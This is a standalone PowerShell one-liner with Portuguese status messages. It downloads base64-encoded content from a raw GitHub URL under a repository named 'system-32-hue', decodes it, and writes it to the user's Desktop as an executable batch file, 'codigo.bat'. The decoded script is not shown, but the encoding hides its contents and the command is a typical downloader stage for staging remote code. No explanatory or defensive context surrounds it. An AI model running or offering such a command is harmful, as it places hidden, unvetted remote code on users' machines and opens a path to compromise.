powershell -NoProfile -Command "$u='https://raw.githubusercontent.com/system-32-hue/test/refs/heads/main/rest';$p=Join-Path ([Environment]::GetFolderPath('Desktop')) 'codigo.bat';try{$b=(Invoke-WebRequest -UseBasicParsing $u).Content.Trim();[IO.File]::WriteAllText($p,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)),[Text.UTF8Encoding]::new($false));Write-Host 'codigo.bat criado'}catch{Write-Host $_.Exception.Message}"
exit
